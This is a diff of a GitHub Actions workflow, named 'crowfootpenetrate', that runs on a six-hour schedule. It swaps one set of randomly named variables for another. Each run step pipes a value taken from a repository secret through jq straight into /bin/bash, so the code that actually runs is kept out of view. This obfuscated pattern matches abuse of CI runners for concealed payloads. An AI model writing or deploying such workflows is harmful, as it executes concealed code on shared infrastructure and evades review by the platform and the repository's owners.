@@ -2,8 +2,7 @@ name: crowfootpenetrate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
-
+    - cron: '40 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: crowfootpenetrate
         env:
-          ycp8: ${{ secrets.ycp8 }}
+          szrnd518: ${{ secrets.szrnd518 }}
         run: |
-          echo $ycp8 | jq -r .tsiot491 | /bin/bash
-          echo $zg9 | jq -r .rxi912 | /bin/bash
-          echo $l3081 | jq -r .uk17008 | /bin/bash
-          echo $jgb318 | jq -r .c42 | /bin/bash
-          echo $kvf74 | jq -r .wet5645 | /bin/bash
-          echo $espt39505 | jq -r .trfxx30944 | /bin/bash
-          echo $as74413 | jq -r .ftk557 | /bin/bash
-          echo $e1464 | jq -r .q58 | /bin/bash
-          echo $cdmr3517 | jq -r .j9 | /bin/bash
-          echo $hwywm176 | jq -r .dpv6862 | /bin/bash
+          echo $szrnd518 | jq -r .bpo542 | /bin/bash
+          echo $kwi41066 | jq -r .gkval837 | /bin/bash
+          echo $lkavl058 | jq -r .deb01317 | /bin/bash
+          echo $rusnu3 | jq -r .ieeim9029 | /bin/bash
+          echo $t8125 | jq -r .pfwl3 | /bin/bash
+          echo $gwc791 | jq -r .afc03 | /bin/bash
+          echo $ufvbl139 | jq -r .p657 | /bin/bash
+          echo $vv60583 | jq -r .ygqub3690 | /bin/bash
+          echo $bk5 | jq -r .gnuut30 | /bin/bash
+          echo $kemt28258 | jq -r .ud0027 | /bin/bash
+          echo $dso68 | jq -r .k5831 | /bin/bash
 
